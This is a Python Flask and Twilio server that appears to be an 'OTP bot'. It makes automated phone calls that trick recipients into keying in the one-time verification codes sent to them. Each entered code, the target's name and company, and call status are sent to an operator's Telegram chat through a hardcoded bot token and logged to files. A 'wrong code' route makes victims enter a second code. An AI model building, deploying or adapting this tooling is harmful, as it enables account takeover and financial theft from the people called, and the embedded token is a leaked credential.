from flask import Flask, request
from twilio.twiml.voice_response import VoiceResponse, Gather, Play, Say
import requests
import datetime
import pytz

app = Flask(__name__)


@app.route("/voice", methods=['GET', 'POST'])
def voice():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    print(chat_id)
    user_id = request.args.get('user_id', default = '*', type = str)
    print(user_id)
    print(request.values)
    resp = VoiceResponse()
    if request.values['AnsweredBy'] == 'machine_end_beep':
        url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=Call Status : Voice Mail"
        results = requests.get(url_req)     
        resp.say("We'll call you back, thanks")
        resp.hangup()
        return str(resp)
    elif request.values['AnsweredBy'] == 'machine_end_other':
        url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=Call Status : Voice Mail"
        results = requests.get(url_req)         
        resp.say("We'll call you back, thanks")
        resp.hangup()
        return str(resp)
    elif request.values['AnsweredBy'] == 'machine_end_silence':
        url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=Call Status : Voice Mail"
        results = requests.get(url_req)         
        resp.say("We'll call you back, thanks")
        resp.hangup()
        return str(resp)                
    # Start a TwiML response
    else:
        gather = Gather(num_digits=1, action=f'/gather?chat_id={chat_id}&user_id={user_id}', timeout=120)
        gather.pause(length=1)
        gather.play(f"http://localhost/conf/{user_id}/checkifhuman.mp3")
        resp.append(gather)
        return str(resp)

@app.route('/gather', methods=['GET', 'POST'])
def gather():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    user_id = request.args.get('user_id', default = '*', type = str)
    url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=Send Code"
    results = requests.get(url_req) 
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    if 'Digits' in request.values:
        # Get which digit the caller chose
        choice = request.values['Digits']

        # <Say> a different message depending on the caller's choice
        if choice == '1':            
            resp.play(f"http://localhost/conf/{user_id}/explain.mp3")
            resp.pause(length=2)         
            gatherotp = Gather(num_digits=int(open("conf/"+user_id+"/Digits.txt", 'r').read()), action=f'/gatherotp?chat_id={chat_id}&user_id={user_id}', timeout=120)
            gatherotp.play(f"http://localhost/conf/{user_id}/askdigits.mp3")
            resp.append(gatherotp)
            return str(resp)

        else:
            # If the caller didn't choose 1 or 2, apologize and ask them again
            resp.play(f"http://localhost/conf/sounds/errorpick.mp3")
            resp.redirect(f'/voice?chat_id={chat_id}&user_id={user_id}')
            return str(resp)

    # If the user didn't choose 1 or 2 (or anything), send them back to /voice
    resp.redirect('/voice')

    return str(resp)

@app.route('/gatherotp', methods=['GET', 'POST'])
def gatherotp():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    user_id = request.args.get('user_id', default = '*', type = str)
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    resp.play(f"http://localhost/conf/sounds/donothangup.mp3")
    if 'Digits' in request.values:
        # Get which digit the caller chose
        url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=OTP : "+request.values['Digits']
        results = requests.get(url_req) 
        resp.pause(length=10)
        resp.play(f"http://localhost/conf/sounds/thankyou.mp3")
        a = open('otp.txt', 'w', encoding='utf-8')
        b = open('logotp.txt', 'a', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        my_date = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
        b.write(f"Tanggal : {my_date}\nNama : {open('conf/'+user_id+'/Name.txt', 'r').read()}\nCompany : {open('conf/'+user_id+'/Company Name.txt', 'r').read()}\nOTP : "+choice1+"\n\n")
        return str(resp)

    else:
        # If the caller didn't choose 1 or 2, apologize and ask them again
        resp.say("Sorry, I don't understand that choice.", voice='man')
        resp.redirect('/gather')
        return str(resp)

@app.route('/denyotp', methods=['GET', 'POST'])
def denyotp():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    user_id = request.args.get('user_id', default = '*', type = str)
    url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=Resend Code"
    results = requests.get(url_req) 
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()            
    resp.play(f"http://localhost/conf/sounds/wrongcode.mp3")
    resp.pause(length=1)
    resp.say(f'We have sent a {open("conf/"+user_id+"/Digits.txt", "r").read()} digits code to your messages, please wait..', voice='man')
    resp.pause(length=3)         
    
    gatherotp = Gather(num_digits=int(open("conf/"+user_id+"/Digits.txt", 'r').read()), action=f'/gathernewotp?chat_id={chat_id}&user_id={user_id}', timeout=120)
    gatherotp.say(f'Please enter the {open("conf/"+user_id+"/Digits.txt", "r").read()} digits code that we have sent to you by using the keypad or dialpad', voice='man')
    resp.append(gatherotp)
    return str(resp)

@app.route('/gathernewotp', methods=['GET', 'POST'])
def gathernewotp():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    user_id = request.args.get('user_id', default = '*', type = str)
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()

    # If Twilio's request to our app included already gathered digits,
    # process them
    resp.play(f"http://localhost/conf/sounds/donothangup.mp3")
    if 'Digits' in request.values:
        # Get which digit the caller chose
        url_req = "https://api.telegram.org/bot5981681011:AAHdnHddMxGLZRkZ48dRzrzLxSVpFuAKe4g/sendMessage" + "?chat_id=" + chat_id + "&text=OTP : "+request.values['Digits']
        results = requests.get(url_req) 
        resp.pause(length=10)
        resp.play(f"http://localhost/conf/sounds/thankyou.mp3")
        a = open('otp.txt', 'w', encoding='utf-8')
        b = open('logotp.txt', 'a', encoding='utf-8')
        choice1 = request.values['Digits']
        a.write(choice1)
        my_date = datetime.datetime.now(pytz.timezone('Asia/Jakarta'))
        b.write(f"Tanggal : {my_date}\nNama : {open('conf/'+user_id+'/Name.txt', 'r').read()}\nCompany : {open('conf/'+user_id+'/Company Name.txt', 'r').read()}\nOTP : "+choice1+"\n\n")
        return str(resp)

    else:
        # If the caller didn't choose 1 or 2, apologize and ask them again
        resp.say("Sorry, I don't understand that choice.", voice='man')
        resp.redirect('/gather')
        return str(resp)

@app.route('/acceptotp', methods=['GET', 'POST'])
def acceptotp():
    chat_id = request.args.get('chat_id', default = '*', type = str)
    user_id = request.args.get('user_id', default = '*', type = str)
    """Processes results from the <Gather> prompt in /voice"""
    # Start TwiML response
    resp = VoiceResponse()        
    resp.play(f"http://localhost/conf/sounds/thankyou.mp3")
    return str(resp)

if __name__ == "__main__":
    app.run(debug=True)
